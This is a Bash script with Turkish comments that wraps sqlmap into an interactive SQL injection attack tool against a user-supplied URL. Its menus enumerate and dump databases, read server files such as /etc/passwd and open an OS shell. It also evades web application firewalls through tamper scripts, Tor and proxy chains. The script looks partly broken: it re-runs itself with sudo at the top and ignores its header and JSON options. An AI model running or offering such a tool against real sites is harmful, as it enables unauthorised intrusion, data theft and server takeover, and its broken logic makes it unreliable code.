#!/bin/bash

# ============================================
# Advanced SQL Injection Exploitation Tool
# ============================================

chmod +x advanced_sqlmap.sh 
sudo ./advanced_sqlmap.sh

# Renkler
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
cat << "EOF"
   _____  ____  _      __  __             
  / ____|/ __ \| |    |  \/  |            
 | (___ | |  | | |    | \  / | __ _ _ __  
  \___ \| |  | | |    | |\/| |/ _` | '_ \ 
  ____) | |__| | |____| |  | | (_| | |_) |
 |_____/ \____/|______|_|  |_|\__,_| .__/ 
    Advanced Enterprise Edition    | |    
                                    |_|    
EOF
echo -e "${NC}"

# Konfigürasyon
TARGET_URL=""
POST_DATA=""
COOKIE=""
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
THREADS=10
LEVEL=5
RISK=3
TIMEOUT=30
RETRIES=3
OUTPUT_DIR="./sqlmap_results_$(date +%Y%m%d_%H%M%S)"

# ============================================
# Fonksiyonlar
# ============================================

print_banner() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

# Hedef URL alma
get_target() {
    echo -e "${YELLOW}═══════════════════════════════════════${NC}"
    read -rp "$(echo -e ${GREEN}[+]${NC}) Hedef URL girin: " TARGET_URL
    
    if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
        print_error "Geçersiz URL formatı!"
        exit 1
    fi
}

# Request tipi seçimi
select_request_type() {
    echo -e "\n${YELLOW}Request Tipi Seçin:${NC}"
    echo "1) GET Request"
    echo "2) POST Request"
    echo "3) Cookie-based Injection"
    echo "4) Header Injection"
    echo "5) JSON Injection"
    read -rp "$(echo -e ${GREEN}[>]${NC}) Seçim: " req_type
    
    case $req_type in
        1) METHOD="GET" ;;
        2) 
            METHOD="POST"
            read -rp "$(echo -e ${GREEN}[+]${NC}) POST Data (örn: username=admin&password=pass): " POST_DATA
            ;;
        3)
            METHOD="COOKIE"
            read -rp "$(echo -e ${GREEN}[+]${NC}) Cookie değeri: " COOKIE
            ;;
        4)
            METHOD="HEADER"
            read -rp "$(echo -e ${GREEN}[+]${NC}) Header adı (örn: X-Forwarded-For): " HEADER_NAME
            ;;
        5)
            METHOD="JSON"
            read -rp "$(echo -e ${GREEN}[+]${NC}) JSON data: " JSON_DATA
            ;;
        *) print_error "Geçersiz seçim!"; exit 1 ;;
    esac
}

# WAF/IPS bypass teknikleri
select_bypass_techniques() {
    echo -e "\n${YELLOW}WAF Bypass Teknikleri:${NC}"
    echo "1) Standart (WAF bypass yok)"
    echo "2) Tamper scripts kullan"
    echo "3) Random User-Agent"
    echo "4) Tor kullan"
    echo "5) Proxy zincirleme"
    echo "6) Tümü (Aggressive)"
    read -rp "$(echo -e ${GREEN}[>]${NC}) Seçim: " bypass
    
    BYPASS_OPTIONS=""
    case $bypass in
        2) BYPASS_OPTIONS="--tamper=space2comment,between,randomcase" ;;
        3) BYPASS_OPTIONS="--random-agent" ;;
        4) BYPASS_OPTIONS="--tor --tor-type=SOCKS5 --check-tor" ;;
        5) 
            read -rp "$(echo -e ${GREEN}[+]${NC}) Proxy listesi (örn: http://proxy1:8080,http://proxy2:8080): " PROXIES
            BYPASS_OPTIONS="--proxy=$PROXIES"
            ;;
        6) BYPASS_OPTIONS="--tamper=space2comment,between,randomcase --random-agent --delay=2 --timeout=60" ;;
    esac
}

# Veritabanı keşfi
database_enumeration() {
    print_banner "Veritabanı keşfi başlatılıyor..."
    
    sqlmap -u "$TARGET_URL" \
        ${POST_DATA:+--data="$POST_DATA"} \
        ${COOKIE:+--cookie="$COOKIE"} \
        --user-agent="$USER_AGENT" \
        --threads=$THREADS \
        --level=$LEVEL \
        --risk=$RISK \
        --batch \
        --dbs \
        $BYPASS_OPTIONS \
        --output-dir="$OUTPUT_DIR"
    
    if [ $? -eq 0 ]; then
        print_banner "Veritabanları listelendi!"
    else
        print_error "Veritabanı keşfi başarısız!"
        return 1
    fi
}

# Tablo keşfi
table_enumeration() {
    read -rp "$(echo -e ${GREEN}[+]${NC}) Hedef veritabanı adı: " DB_NAME
    
    print_banner "Tablolar listeleniyor..."
    
    sqlmap -u "$TARGET_URL" \
        ${POST_DATA:+--data="$POST_DATA"} \
        ${COOKIE:+--cookie="$COOKIE"} \
        --user-agent="$USER_AGENT" \
        --threads=$THREADS \
        --level=$LEVEL \
        --risk=$RISK \
        --batch \
        -D "$DB_NAME" \
        --tables \
        $BYPASS_OPTIONS \
        --output-dir="$OUTPUT_DIR"
}

# Kolon keşfi
column_enumeration() {
    read -rp "$(echo -e ${GREEN}[+]${NC}) Veritabanı adı: " DB_NAME
    read -rp "$(echo -e ${GREEN}[+]${NC}) Tablo adı: " TABLE_NAME
    
    print_banner "Kolonlar listeleniyor..."
    
    sqlmap -u "$TARGET_URL" \
        ${POST_DATA:+--data="$POST_DATA"} \
        ${COOKIE:+--cookie="$COOKIE"} \
        --user-agent="$USER_AGENT" \
        --threads=$THREADS \
        --level=$LEVEL \
        --risk=$RISK \
        --batch \
        -D "$DB_NAME" \
        -T "$TABLE_NAME" \
        --columns \
        $BYPASS_OPTIONS \
        --output-dir="$OUTPUT_DIR"
}

# Veri çekme
dump_data() {
    read -rp "$(echo -e ${GREEN}[+]${NC}) Veritabanı adı: " DB_NAME
    read -rp "$(echo -e ${GREEN}[+]${NC}) Tablo adı: " TABLE_NAME
    
    echo -e "\n${YELLOW}Dump Seçenekleri:${NC}"
    echo "1) Tüm verileri çek"
    echo "2) Belirli kolonları çek"
    echo "3) WHERE koşulu ile çek"
    read -rp "$(echo -e ${GREEN}[>]${NC}) Seçim: " dump_choice
    
    DUMP_OPTIONS="-D $DB_NAME -T $TABLE_NAME --dump"
    
    case $dump_choice in
        2)
            read -rp "$(echo -e ${GREEN}[+]${NC}) Kolon adları (virgülle ayırın): " COLUMNS
            DUMP_OPTIONS="$DUMP_OPTIONS -C $COLUMNS"
            ;;
        3)
            read -rp "$(echo -e ${GREEN}[+]${NC}) WHERE koşulu (örn: id>100): " WHERE
            DUMP_OPTIONS="$DUMP_OPTIONS --where=\"$WHERE\""
            ;;
    esac
    
    print_banner "Veriler çekiliyor..."
    
    sqlmap -u "$TARGET_URL" \
        ${POST_DATA:+--data="$POST_DATA"} \
        ${COOKIE:+--cookie="$COOKIE"} \
        --user-agent="$USER_AGENT" \
        --threads=$THREADS \
        --level=$LEVEL \
        --risk=$RISK \
        --batch \
        $DUMP_OPTIONS \
        $BYPASS_OPTIONS \
        --output-dir="$OUTPUT_DIR"
    
    print_banner "Veriler kaydedildi: $OUTPUT_DIR"
}

# Shell alma
get_shell() {
    print_warning "OS Shell almaya çalışılıyor..."
    
    sqlmap -u "$TARGET_URL" \
        ${POST_DATA:+--data="$POST_DATA"} \
        ${COOKIE:+--cookie="$COOKIE"} \
        --user-agent="$USER_AGENT" \
        --batch \
        --os-shell \
        $BYPASS_OPTIONS \
        --output-dir="$OUTPUT_DIR"
}

# Dosya okuma
file_read() {
    read -rp "$(echo -e ${GREEN}[+]${NC}) Okunacak dosya yolu (örn: /etc/passwd): " FILE_PATH
    
    sqlmap -u "$TARGET_URL" \
        ${POST_DATA:+--data="$POST_DATA"} \
        ${COOKIE:+--cookie="$COOKIE"} \
        --user-agent="$USER_AGENT" \
        --batch \
        --file-read="$FILE_PATH" \
        $BYPASS_OPTIONS \
        --output-dir="$OUTPUT_DIR"
}

# Otomatik full exploitation
auto_exploit() {
    print_banner "Otomatik tam exploitation başlatılıyor..."
    
    sqlmap -u "$TARGET_URL" \
        ${POST_DATA:+--data="$POST_DATA"} \
        ${COOKIE:+--cookie="$COOKIE"} \
        --user-agent="$USER_AGENT" \
        --threads=$THREADS \
        --level=$LEVEL \
        --risk=$RISK \
        --batch \
        --dump-all \
        --exclude-sysdbs \
        $BYPASS_OPTIONS \
        --output-dir="$OUTPUT_DIR"
}

# ============================================
# Ana Menü
# ============================================

main_menu() {
    while true; do
        echo -e "\n${YELLOW}═══════════════════════════════════════${NC}"
        echo -e "${GREEN}Ana Menü${NC}"
        echo -e "${YELLOW}═══════════════════════════════════════${NC}"
        echo "1)  Veritabanlarını Listele"
        echo "2)  Tabloları Listele"
        echo "3)  Kolonları Listele"
        echo "4)  Veri Çek (Dump)"
        echo "5)  OS Shell Al"
        echo "6)  Dosya Oku"
        echo "7)  Otomatik Full Exploit"
        echo "8)  Yeni Hedef Belirle"
        echo "9)  Ayarları Değiştir"
        echo "0)  Çıkış"
        echo -e "${YELLOW}═══════════════════════════════════════${NC}"
        
        read -rp "$(echo -e ${GREEN}[>]${NC}) Seçim: " choice
        
        case $choice in
            1) database_enumeration ;;
            2) table_enumeration ;;
            3) column_enumeration ;;
            4) dump_data ;;
            5) get_shell ;;
            6) file_read ;;
            7) auto_exploit ;;
            8) get_target; select_request_type; select_bypass_techniques ;;
            9) 
                read -rp "Threads ($THREADS): " new_threads
                THREADS=${new_threads:-$THREADS}
                read -rp "Level ($LEVEL): " new_level
                LEVEL=${new_level:-$LEVEL}
                read -rp "Risk ($RISK): " new_risk
                RISK=${new_risk:-$RISK}
                ;;
            0) print_info "Çıkılıyor..."; exit 0 ;;
            *) print_error "Geçersiz seçim!" ;;
        esac
    done
}

# ============================================
# Script Başlangıcı
# ============================================

# Root kontrolü
if [[ $EUID -ne 0 ]]; then
   print_warning "Bu script root olarak çalıştırılmalıdır (sudo)"
fi

# SQLMap kontrolü
if ! command -v sqlmap &> /dev/null; then
    print_error "SQLMap yüklü değil! Yükleniyor..."
    sudo apt install sqlmap -y
fi

# Hedef belirleme
get_target
select_request_type
select_bypass_techniques

# Ana menüyü başlat
main_menu
